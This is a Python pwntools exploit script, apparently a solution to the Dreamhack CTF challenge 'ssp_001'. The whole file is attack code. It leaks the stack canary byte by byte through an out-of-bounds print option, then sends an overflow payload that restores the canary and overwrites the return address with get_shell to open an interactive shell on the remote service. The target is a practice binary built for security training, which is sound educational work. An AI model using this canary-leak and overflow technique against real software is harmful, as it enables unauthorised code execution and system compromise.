from pwn import *


context.log_level = 'debug'
context.arch = 'i386'

# p = process("./ssp_001")
p = remote("host3.dreamhack.games", 9408)
e = ELF("./ssp_001")

get_shell = e.symbols['get_shell']

canary = b''

for i in range(4):
    p.sendlineafter(b'> ', b'P')
    payload = str(i + 0x80).encode()
    p.sendlineafter(b': ', payload)
    p.recvuntil(b': ')
    canary = p.recvuntil(b'\n')[:-1] + canary

canary = int(canary, 16)

p.sendlineafter(b'> ', b'E')
p.sendlineafter(b': ', b'80')

payload = b'A' * 0x40

payload += p32(canary)
payload += b'B' * 0x8
payload += p32(get_shell)

p.sendafter(b': ', payload)

p.interactive()
